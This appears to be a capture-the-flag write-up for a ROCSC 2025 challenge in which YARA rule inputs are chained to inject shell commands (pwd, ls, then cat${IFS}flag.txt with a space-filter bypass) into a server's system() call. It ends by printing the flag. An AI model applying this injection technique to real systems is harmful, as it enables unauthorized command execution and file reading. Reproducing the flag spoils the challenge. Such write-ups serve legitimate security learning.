<img src="https://github.com/raul-dunca/rocsc_2025_quals/blob/main/.assets/iarasi_description.png">

It seemed like the server takes your input, and it puts it in a `.yar` file and the matches are returned. What caught my attention while playing around with the server is that for the input (this rule should return all the files that contain the character *): 

```txt
rule ListFiles { strings: $txt = "*" condition: $txt }
```

I would see this error:

```txt
[YARA] Command to system(): *
sh: 1: flag.txt: not found
```
Hmm, interesting the command to system is * which is the character I used and after some more testing it seemed that the character used in the rule will be added to `command to system()` only if a match is happening (at least a file contains that character). After some more testing I found out that if the rule has exactly 1 letter it will also be appended to `command to system()` so I send the following 2 rules (separately):

```txt
rule ListFiles { strings: $txt = "p" condition: $txt }
rule w { strings: $txt = "d" condition: $txt }
```
And after quitting I saw:

```txt
[YARA] Command to system(): pwd
/home/ctf
```
Good, `pwd` got executed now I tried to run `ls`: 

```txt
rule ListFiles { strings: $txt = "l" condition: $txt }
rule test { strings: $txt = "s" condition: $txt }
```
Output:

```txt
[YARA] Command to system(): ls
flag.txt run.sh server.py testfile.txt
```

Nice, now I just need to `cat flag.txt`, but as I said before a match was needed for the character to be added to `command to system()` or for that character to be the name of the rule (and you can’t name a rule: “ “) and the `testfile.txt` from the server did not contain a space in it, so I had to find an alternative approach. I tried to run `cat${IFS}flag.txt` ($IFS is an environment variable which contains separators):

```txt
rule ListFiles { strings: $txt = "c" condition: $txt }
rule a { strings: $txt = "t" condition: $txt }
rule ff { strings: $txt = "$" condition: $txt }
rule aa { strings: $txt = "{" condition: $txt }
rule I { strings: $txt = "F" condition: $txt }
rule S { strings: $txt = "}" condition: $txt }
rule f { strings: $txt = "l" condition: $txt }
rule bb { strings: $txt = "a" condition: $txt }
rule g { strings: $txt = "." condition: $txt }
rule tt { strings: $txt = "t" condition: $txt }
rule x { strings: $txt = "t" condition: $txt }
```

Output:

```txt
[YARA] Command to system(): cat${IFS}flag.txt
ctf{bd07ea96ee394b654044c48dca65b994c205cc511c4b9f8a03bb471a8db9319e}
```

Important note: I used 2 letter rules to avoid rule names like “{“ which I don’t think would’ve worked.

`ctf{bd07ea96ee394b654044c48dca65b994c205cc511c4b9f8a03bb471a8db9319e}`
